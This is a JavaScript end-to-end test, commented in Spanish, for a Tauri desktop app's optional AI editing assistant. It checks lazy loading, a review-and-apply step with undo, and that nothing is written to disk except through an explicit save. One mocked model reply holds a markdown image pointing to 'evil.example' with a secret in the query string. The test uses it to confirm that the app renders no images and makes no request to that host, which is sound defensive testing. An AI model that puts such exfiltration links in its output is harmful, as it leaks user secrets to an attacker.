// =============================================================================
// DBV Unreal AI — Plantilla Tauri v2 + dbv-specs-ops
// Copyright (c) 2026 David Bueno Vallejo and David Bueno Carmona
// Licensed under the MIT License. See LICENSE for details.
// Built with dbv-specs-ops · https://github.com/davidbuenov/dbv-specs-ops
// =============================================================================
//
// IA opcional sobre el documento de la demo, en el motor de WebView2 (Edge/Chromium headless) con el
// backend de Rust simulado: cero huella al arrancar, «Conectar una IA» sin conexiones, conversación con
// herramientas, revisión, aplicar en el editor (deshacible, sin tocar el disco) y guardar con el botón.
//
// Sirve también de plantilla para el banco de tu app real: cambia `customInvoke` y los selectores.

import { fileURLToPath } from 'node:url';
import path from 'node:path';
import { findEdge, launch } from './harness.mjs';

if (!findEdge()) {
  console.log('Sin Edge/Chromium: se omite este banco (define EDGE_PATH para indicarlo).');
  process.exit(0);
}

const appDir = path.join(path.dirname(path.dirname(path.dirname(fileURLToPath(import.meta.url)))), 'src').replace(/\\/g, '/');
const note = ['# Notas', '', 'Hay un erorr de ortografia aqui.', ''].join('\n');
const connection = { id: 'c1', name: 'Ollama · qwen2.5:3b', provider: 'ollama', baseUrl: 'http://localhost:11434', model: 'qwen2.5:3b', hasKey: false, contextTokens: 8192, supportsTools: true, supportsImages: false };

function extra(connections) {
  return JSON.stringify({
    ai_connections: { connections, active: connections[0]?.id ?? null, showAi: true },
    ai_providers: [{ provider: 'ollama', baseUrl: 'http://localhost:11434', cloud: false, contextTokens: 8192, maxOutputTokens: 4096 }],
    ai_model_info: null,
    ai_detect: { servers: [{ provider: 'ollama', running: true, models: ['qwen2.5:3b'] }], tools: [] },
    ai_list_files: ['notas.md'],
    ai_project_state_load: null,
    ai_project_state_save: null,
    ai_check_proposal: { diagnostics: [] },
    ai_write_file: null,
    demo_workspace: 'C:/demo',
  });
}

// El modelo: 1.ª llamada → propone un cambio con la herramienta; 2.ª → texto final (con una imagen de exfiltración).
const customInvoke = `((cmd, args) => {
  if (cmd === 'ai_read_file') return ${JSON.stringify(note)};
  if (cmd !== 'ai_chat') return undefined;
  window.__chat.push(args);
  const n = window.__chat.length;
  const call = { type: 'toolCall', id: 't1', name: 'propose_changes', arguments: JSON.stringify({ summary: 'Corrige la ortografía', changes: [{ path: 'notas.md', action: 'edit', search: 'un erorr de ortografia', replace: 'un error de ortografía' }] }) };
  const script = n === 1
    ? [call, { type: 'done', stopReason: 'tool_use' }]
    : [{ type: 'text', text: 'Corregido. ![x](https://evil.example/a.png?q=SECRETO)' }, { type: 'done', stopReason: 'end_turn' }];
  script.forEach((ev, i) => setTimeout(() => window.__emit('ai-stream', { requestId: args.requestId, ...ev }), 15 + i * 8));
  return null;
})`;

let failed = 0;
const ok = (name, cond, detail = '') => { console.log(`${cond ? '  ok ' : '  FALLA'} ${name}${detail ? ' — ' + detail : ''}`); if (!cond) failed++; };
const aiRequests = `performance.getEntriesByType('resource').map((r) => r.name).filter((n) => /\\/ai\\//.test(n))`;

// ── Sin IA conectada: cero huella, y ✨ abre «Conectar una IA» ───────────────────────────────────────
{
  const h = await launch({ appDir, docPath: 'C:/demo/notas.md', docContent: note, extraInvoke: extra([]), customInvoke });
  try {
    await h.sleep(800);
    const boot = await h.eval(`return { ai: ${aiRequests}, doc: document.getElementById('demo-doc').value, disabled: document.getElementById('demo-doc').disabled }`);
    ok('al arrancar NO se pide ningún fichero de src/ai/ (zero-footprint)', boot.ai.length === 0, JSON.stringify(boot.ai));
    ok('el documento de la demo se carga en el editor', boot.doc.includes('erorr') && !boot.disabled);
    await h.eval(`document.getElementById('btn-ai').click()`);
    await h.sleep(1500);
    const connect = await h.eval(`return { modal: !document.getElementById('ai-connect-modal').classList.contains('hidden'), loaded: ${aiRequests}.length > 0, body: document.getElementById('ai-connect-body').children.length > 0 }`);
    ok('con ninguna IA conectada, ✨ abre «Conectar una IA»', connect.modal && connect.body);
    ok('y solo entonces se descarga src/ai/', connect.loaded);
    const errs = h.errors();
    ok('sin excepciones ni console.error', errs.length === 0, JSON.stringify(errs.slice(0, 3)));
  } finally {
    await h.close();
  }
}

// ── Con una conexión: conversación, revisión, aplicar (Ctrl+Z) y guardar ────────────────────────────
{
  const h = await launch({ appDir, docPath: 'C:/demo/notas.md', docContent: note, extraInvoke: extra([connection]), customInvoke });
  try {
    await h.sleep(800);
    await h.eval(`document.getElementById('btn-ai').click()`);
    await h.sleep(1500);
    const panel = await h.eval(`return { open: !document.getElementById('ai-panel-container').classList.contains('hidden'), modal: !document.getElementById('ai-connect-modal').classList.contains('hidden'), title: document.querySelector('.ai-panel__title')?.textContent }`);
    ok('con una conexión, ✨ abre el Asistente (no el modal)', panel.open && !panel.modal, JSON.stringify(panel));

    await h.eval(`const i = document.querySelector('.ai-panel__input'); i.value = 'Corrige la ortografía'; i.dispatchEvent(new Event('input', { bubbles: true }));`);
    await h.key('Enter', 'Enter', 13);
    await h.sleep(1800);
    const conv = await h.eval(`return {
      review: !!document.querySelector('.ai-review'),
      file: document.querySelector('.ai-file__path')?.textContent,
      tools: (window.__chat[0].request.tools || []).map((t) => t.name).sort(),
      ctxHasDoc: window.__chat[0].request.messages.some((m) => /notas\\.md/.test(m.content)),
      images: [...document.querySelectorAll('.ai-msg--assistant img')].length,
    }`);
    ok('el modelo recibe las cinco herramientas', JSON.stringify(conv.tools) === JSON.stringify(['get_outline', 'list_files', 'propose_changes', 'read_file', 'search_files']), JSON.stringify(conv.tools));
    ok('el documento abierto va en el contexto', conv.ctxHasDoc);
    ok('aparece la tarjeta de revisión del documento', conv.review && conv.file === 'notas.md', JSON.stringify(conv));
    ok('la salida de la IA no pinta imágenes (el render construye nodos, sin innerHTML)', conv.images === 0);
    const requested = await h.eval(`return performance.getEntriesByType('resource').map((r) => r.name).filter((n) => n.includes('evil.example'))`);
    ok('y el navegador no pidió ninguna dirección del atacante', requested.length === 0, JSON.stringify(requested));

    await h.eval(`document.querySelector('.ai-review__actions .button--primary').click()`);
    await h.sleep(800);
    const applied = await h.eval(`return { fixed: document.getElementById('demo-doc').value.includes('un error de ortografía'), writes: window.__calls.filter((c) => c[0] === 'ai_write_file').length, dirty: document.body.classList.contains('is-dirty') }`);
    ok('aplicar corrige el texto del editor', applied.fixed);
    ok('nada se escribió en disco por detrás del editor', applied.writes === 0);
    ok('y el documento queda «con cambios sin guardar» (activa el aviso al cerrar)', applied.dirty);

    await h.eval(`document.getElementById('demo-doc').focus();`);
    await h.key('z', 'KeyZ', 90, 2); // Ctrl+Z
    await h.sleep(400);
    ok('Ctrl+Z deshace el cambio de la IA (edición nativa del textarea)', (await h.eval(`return document.getElementById('demo-doc').value.includes('un erorr de ortografia')`)) === true);

    // Guardar con el botón escribe con el comando confinado de Rust.
    await h.eval(`document.getElementById('doc-save').click(); await new Promise((r) => setTimeout(r, 300));`);
    const saved = await h.eval(`return window.__calls.filter((c) => c[0] === 'ai_write_file').map((c) => c[1])`);
    ok('«Guardar» escribe notas.md con el comando confinado', saved.length === 1 && saved[0].relative === 'notas.md' && saved[0].root === 'C:/demo', JSON.stringify(saved));

    const errs = h.errors();
    ok('sin excepciones ni console.error', errs.length === 0, JSON.stringify(errs.slice(0, 3)));
  } finally {
    await h.close();
  }
}

console.log(failed ? `\n${failed} fallos` : '\nTodo correcto');
process.exit(failed ? 1 : 0);
